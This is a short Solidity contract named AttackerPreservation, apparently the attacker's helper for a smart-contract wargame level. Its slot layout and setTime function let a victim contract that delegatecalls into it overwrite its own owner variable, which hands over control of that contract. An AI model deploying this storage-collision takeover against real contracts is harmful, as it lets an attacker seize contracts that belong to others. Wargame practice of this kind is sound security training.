// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackerPreservation {
    address public one;
    address public two;
    address public owner;

    function setTime(uint256 owner_) public {
        owner = address(owner_);
    }
}
